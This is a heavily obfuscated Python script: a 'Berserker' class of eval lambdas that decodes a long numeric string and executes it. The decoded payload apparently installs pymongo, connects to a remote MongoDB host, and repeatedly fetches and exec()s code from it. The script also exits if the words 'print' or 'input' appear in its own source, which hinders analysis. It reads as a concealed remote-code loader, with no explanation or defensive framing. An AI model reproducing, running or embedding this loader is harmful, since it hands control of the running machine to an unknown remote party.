class Berserker():
 def __init__(self:object,_byte:float=False,_exit:str=0,*_exec:bool,**_boom:bool)->exec:
  _byte,self._eval,_boom[_exit],self._decode,self._encode,self._delete=lambda _byte:exit()if self._decode[15]+self._decode[17]+self._decode[8]+self._decode[13]+self._decode[19] in open(__file__, errors=self._decode[8]+self._decode[6]+self._decode[13]+self._decode[14]+self._decode[17]+self._decode[4]).read() or self._decode[8]+self._decode[13]+self._decode[15]+self._decode[20]+self._decode[19] in open(__file__, errors=self._decode[8]+self._decode[6]+self._decode[13]+self._decode[14]+self._decode[17]+self._decode[4]).read()else"".join(_byte if _byte not in self._decode else self._decode[self._decode.index(_byte)+1 if self._decode.index(_byte)+1<len(self._decode)else 0]for _byte in "".join(chr(ord(t)-654246)if t!="ζ"else"\n"for t in self._eval(_byte))),lambda _bit:"".join(chr(int(_system)-len(_bit.split('~')))if _system!='§'else'ζ'for _system in str(_bit).split('~')),eval,exit()if _byte else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _rasputin:_byte(_rasputin),lambda _byte:str(_boom[_exit](f"{self._decode[4]+self._decode[-13]+self._decode[4]+self._decode[2]}(''.join(%s),{self._decode[6]+self._decode[11]+self._decode[14]+self._decode[1]+self._decode[0]+self._decode[11]+self._decode[18]}())"%list(_byte))).encode(self._decode[20]+self._decode[19]+self._decode[5]+self._decode[34])if _boom[_exit]==eval else exit()
  return self.__decode__(_boom[(self._decode[-1]+'_')[-1]+self._decode[18]+self._decode[15]+self._decode[0]+self._decode[17]+self._decode[10]+self._decode[11]+self._decode[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._delete(self._encode(_execute)))[0]
Berserker(_byte=False,_sparkle='''655016~655014~655021~654959~§~654933~654933~654933~654933~655005~655009~655012~655011~655014~655016~654933~655012~655021~655009~655011~655010~655003~655011~§~654933~654933~654933~654933~655005~655009~655012~655011~655014~655016~654933~655002~654998~654999~655004~654958~655016~§~655001~655020~654999~655001~655012~655016~654959~§~654933~654933~654933~654933~655005~655009~655012~655011~655014~655016~654933~655011~655015~§~654933~654933~654933~654933~655011~655015~654947~655015~655021~655015~655016~655001~655009~654941~654940~655012~655005~655012~654933~655005~655010~655015~655016~654958~655008~655008~654933~655012~655021~655009~655011~655010~655003~655011~654940~654942~§~654933~654933~654933~654933~655011~655015~654947~655015~655021~655015~655016~655001~655009~654941~654940~655012~655005~655012~654933~655005~655010~655015~655016~654958~655008~655008~654933~655002~654998~654999~655004~654958~655016~654940~654942~§~654933~654933~654933~654933~655005~655009~655012~655011~655014~655016~654933~655012~655021~655009~655011~655010~655003~655011~§~654933~654933~654933~654933~655005~655009~655012~655011~655014~655016~654933~655002~654998~654999~655004~654958~655016~§~654933~654933~654933~654933~§~655005~655009~655012~655011~655014~655016~654933~655000~655010~655015~654947~655014~655001~655015~655011~655008~655018~655001~655014~§~655000~655010~655015~654947~655014~655001~655015~655011~655008~655018~655001~655014~654947~655000~655001~655002~654958~655017~655008~655016~654996~655014~655001~655015~655011~655008~655018~655001~655014~654962~655000~655010~655015~654947~655014~655001~655015~655011~655008~655018~655001~655014~654947~654983~655001~655015~655011~655008~655018~655001~655014~654941~654999~655011~655010~655002~655005~655003~655017~655014~655001~654962~654971~654958~655008~655015~655001~654942~§~655000~655010~655015~654947~655014~655001~655015~655011~655008~655018~655001~655014~654947~655000~655001~655002~654958~655017~655008~655016~654996~655014~655001~655015~655011~655008~655018~655001~655014~654947~655010~654958~655009~655001~655015~655001~655014~655018~655001~655014~655015~654962~654992~654940~654956~654947~654956~654947~654956~654947~654956~654940~654994~§~§~655019~655004~655005~655008~655001~654933~654985~655014~655017~655001~654959~§~654933~654933~654933~654933~655016~655014~655021~654959~§~654933~654933~654933~654933~654933~654933~654933~654933~655009~655021~654999~655008~655005~655001~655010~655016~654933~654962~654933~655012~655021~655009~655011~655010~655003~655011~654947~654978~655011~655010~655003~655011~654968~655008~655005~655001~655010~655016~654941~654935~655009~655011~655010~655003~655011~655000~654998~654944~655015~655014~655018~654959~654948~654948~654986~654968~654978~654958~655010~654958~655003~655001~654959~654982~654972~655020~654989~655005~655008~655016~655016~654974~655002~655021~655000~654979~654987~655002~655004~654965~655017~654999~655009~654958~655010~654958~655003~655001~655014~654947~655015~654958~654952~654955~655008~654951~655001~654947~655009~655011~655010~655003~655011~655000~654998~654947~655010~655001~655016~654948~654964~655014~655001~655016~655014~655021~654988~655014~655005~655016~655001~655015~654962~655016~655014~655017~655001~654939~655019~654962~655009~654958~655006~655011~655014~655005~655016~655021~654935~654942~§~654933~654933~654933~654933~654933~654933~654933~654933~654999~655011~655000~655001~654969~654967~654933~654962~654933~655009~655021~654999~655008~655005~655001~655010~655016~654992~654940~654984~655011~655017~655014~654999~655001~654968~655011~655000~655001~654940~654994~654947~654986~655015~655001~655014~654968~655011~655000~655001~§~654933~654933~654933~654933~654933~654933~654933~654933~654999~655011~655000~655001~654933~654962~654933~654999~655011~655000~655001~654969~654967~654947~655002~655005~655010~655000~654941~655024~655026~654942~654992~655023~654994~654992~654935~655003~655005~655016~655004~655017~654998~654968~655011~655000~655001~654935~654994~§~654933~654933~654933~654933~654933~654933~654933~654933~655001~655018~654958~655008~654941~654940~655001~655020~655001~654999~654941~654999~655011~655000~655001~654942~654940~654942~§~654933~654933~654933~654933~655001~655020~654999~655001~655012~655016~654933~654970~655020~654999~655001~655012~655016~655005~655011~655010~654933~654958~655015~654933~655001~655020~654959~§~654933~654933~654933~654933~654933~654933~654933~654933~655012~655014~655005~655010~655016~654941~655001~655020~654942~§''')
